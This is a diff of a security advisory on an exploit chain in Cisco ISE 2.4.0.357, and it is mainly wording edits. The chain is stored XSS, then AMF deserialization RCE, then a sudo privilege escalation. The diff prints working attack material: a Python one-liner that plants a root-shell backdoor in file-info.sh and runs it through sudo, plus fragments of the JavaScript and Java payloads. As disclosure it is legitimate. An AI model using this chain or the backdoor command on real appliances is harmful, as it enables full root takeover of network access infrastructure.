@@ -22,17 +22,20 @@
 ## Summary
 ISE is distributed by Cisco as a virtual appliance. We have analysed version 2.4.0.357 and found three vulnerabilities: an unauthenticated stored cross site scripting, a authenticated Java deserialization vulnerability leading to remote code execution as an unprivileged user, and a privilege escalation from that unprivileged user to root.
 
-By putting them all together, we can achieve remote code execution as root, provided we can trap an administrator into visiting the ISE page vulnerable to the stored cross site scripting. A Ruby exploit that implements this full exploit chain (described in more detail at 'Exploitation summary', at the end of this file) is [publicly available](https://github.com/pedrib/PoC/blob/master/exploits/ISEpwn/ISEpwn.rb) in the [same repository](https://github.com/pedrib/PoC) as this advisory.
+By putting them all together, we can achieve remote code execution as root, provided we can convince an administrator into visiting the ISE page vulnerable to the stored cross site scripting. Therefore, this vulnerability chain is ideal to demonstrate the risks of Cross Site Scripting when paired with a phishing attack.
 
-You can also see a [video of the exploit in action](TODO_VIDEO_LINK) on YouTube and in the [same repository](https://github.com/pedrib/PoC) where you find this advisory.
+A Ruby exploit that implements this full exploit chain (described in more detail in [End to End Exploit](#end-to-end-exploit), at the end of this file) is [publicly available](https://github.com/pedrib/PoC/blob/master/exploits/ISEpwn/ISEpwn.rb) in the [same repository](https://github.com/pedrib/PoC/blob/master/advisories/Cisco/cisco_ise_rce.md) as this advisory.
 
-VIDEO_BELOW
+You can also see a [video of the exploit in action](https://www.youtube.com/watch?v=NZmZid-1_jU) on YouTube.
+
+[![ISEpwn video](https://img.youtube.com/vi/NZmZid-1_jU0.jpg)](https://www.youtube.com/watch?v=NZmZid-1_jU)
 
 All the vulnerabilities in this advisory were found independently by Agile Information Security. However, vulnerability #2 (Unsafe Flex AMF Java Object Deserialization) was also [found and reported to Cisco](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCvj62599) by Olivier Arteau of Groupe Technologie Desjardins and vulnerability #3 (Privilege Escalation via Incorrect sudo File Permissions) was also [found and reported to Cisco](https://bst.cloudapps.cisco.com/bugsearch/bug/CSCve49987) by Hector Cuesta.
 
 While [Cisco attributed credit](https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190109-ise-multi-xss) to Agile Information Security for finding vulnerability #1, it did not do so with finding vulnerabilities #2 and #3, and also refused to provide a CVE for both these vulnerabilities. 
 
-It also said that regarding #3, "This issue has been evaluated as a hardening effort to improve the security posture of the device. According with our Security vulnerability policy, we request do not request a CVE assignment for issue with a Severity Impact Rating (SIR) lower than Medium. This issue will be fixed in the upcoming ISE release". 
+It also said that regarding #3:
+> "This issue has been evaluated as a hardening effort to improve the security posture of the device. According with our Security vulnerability policy, we request do not request a CVE assignment for issue with a Severity Impact Rating (SIR) lower than Medium. This issue will be fixed in the upcoming ISE release". 
 
 As of 05/02/2019, Cisco still recommends version 2.4.0.357 - affected by all the vulnerabilities in this advisory - as the "Suggested Release" in their software download page.
 
@@ -40,7 +43,7 @@ These actions show Cisco is incredibly negligent with regards to the security of
 
 Agile Information Security would like to thank Beyond Security's SSD Secure Disclosure programme for helping us disclose these vulnerabilities to Cisco, and publishing the advisory [on their site](https://ssd-disclosure.com/index.php/archives/3778).
 
-This advisory was last updated in 30/06/2021 (ported to markdown and video link added).
+This advisory was last updated in 30/06/2021 (ported to markdown, polished exploit and video link added).
 
 
 ## Vulnerability Details
@@ -53,13 +56,13 @@ This advisory was last updated in 30/06/2021 (ported to markdown and video link 
 * Affected versions: confirmed on ISE virtual appliance v2.4.0.357
 
 The *LiveLogSettingsServlet*, exposed to unauthenticated users at */admin/LiveLogSettingsServlet*, contains a stored cross site scripting vulnerability.
-The doGet() HTTP request handler takes in an Action parameter as a HTTP query variable, which can be "read" or "write". 
+The *doGet()* HTTP request handler takes in an *Action* parameter as a HTTP query variable, which can be "read" or "write". 
 
 With the "write" parameter, it calls the *writeLiveLogSettings()* function which then takes several query string variables, such as Columns, Rows, Refresh_rate and Time_period.
 
-The content of these query string variables is then written to */opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt*, and the server responds with a 200 OK. These parameters are not validated, and can contain any text.
+The content of these query string variables is then written to */opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt*, and the server responds with an HTTP 200 OK. These parameters are not validated, and can contain any text.
 
-When the Action parameter equals "read", the servlet will read the */opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt* file and display it back to the user with the Content-Type *"text/html"*, causing whatever was written to that file to be rendered and executed by the browser.
+When the *Action* parameter equals "read", the servlet will read the */opt/CSCOcpm/mnt/dashboard/liveAuthProps.txt* file and display it back to the user with the Content-Type *"text/html"*, causing whatever was written to that file to be rendered and executed by the browser.
 
 To mount a simple attack, we can send the following request:
 ```
@@ -86,7 +89,7 @@ Server:
 </Settings>
 ```
 
-This will result in an alert box being popped in the browser. This vulnerability can be exploited by an unauthenticated attacker.
+This will result in an alert box being popped in the browser, which means Javascript code was executed in the browser. This vulnerability can be exploited by an unauthenticated attacker.
 
 
 ### #2: Unsafe Flex AMF Java Object Deserialization
@@ -175,14 +178,17 @@ However all of the files above are writeable by the iseadminportal user. This ma
 ## End to End exploit
 By now you should have a decent idea of how to build a full exploit chain. Since vulnerability #2 (AMF RCE) can only be exploited by an authenticated administrator, we can set up a trap using vulnerability #1 (stored XSS) as an unauthenticated attacker.
 
-By abusing the stored cross site scripting, we can create a malicious Javascript that will be stored in /admin/LiveLogSettingsServlet. If a logged in user visits that page the Javascript payload (see below) will send a *XMLHttpRequest* to */admin/messagebroker/amfsecure* with the payload created by the AMF Java code (see below), and start the exploit described in vulnerability #2 (AMF RCE) to obtain a reverse shell as the iseadminuser.
+The attack sequence is as follows:
 
-Once we have the reverse shell, we can run the following command to abuse vulnerability #3 (privilege escalation):
+1. By abusing the stored cross site scripting (vulnerability #1), we can create a malicious Javascript (payload below) that will be stored in */admin/LiveLogSettingsServlet*
+2. If a logged in user visits that page, the Javascript payload will send a *XMLHttpRequest* to */admin/messagebroker/amfsecure* with the payload created by the AMF Java code below (vulnerability #2), achieving remote code execution as the iseadminportal user
+3. The exploit code will return a reverse shell, and we can then use the incorrect file permissions (vulnerability #3) to escalate our privileges to root:
+
 ```
 python -c 'import os;f=open("/opt/CSCOcpm/bin/file-info.sh", "a+", 0);f.write("if [ \"$1\" == 1337 ];then\n/bin/bash\nfi\n");f.close();os.system("sudo /opt/CSCOcpm/bin/file-info.sh 1337")'
 ```
 
-This will add an "if" clause at the end of */opt/CSCOcpm/bin/file-info.sh* that looks for the "1337" parameter, and executes /bin/bash as root when it sees it. That way we won't mess with any important system functionality that might use that file, and we will get our full root shell.
+This python code will add an "if" clause at the end of */opt/CSCOcpm/bin/file-info.sh* that looks for the "1337" parameter, and executes /bin/bash as root when it sees it. That way we won't mess with any important system functionality that might use that file, and we will get our full root shell.
 
 The full exploit, written in Ruby, [is available here](https://github.com/pedrib/PoC/blob/master/exploits/ISEpwn/ISEpwn.rb).
 
@@ -215,6 +221,8 @@ xhr.send(b64toBlob(b64_payload, 'application/x-amf'));
 
 AMF Java code ([provided here](https://github.com/pedrib/PoC/tree/master/exploits/ISEpwn/ACSFlex) as a Maven project):
 ```java
+package uk.co.agileinfosec.acsflex;
+
 import flex.messaging.io.amf.MessageBody;
 import flex.messaging.io.amf.ActionMessage;
 import flex.messaging.io.SerializationContext;
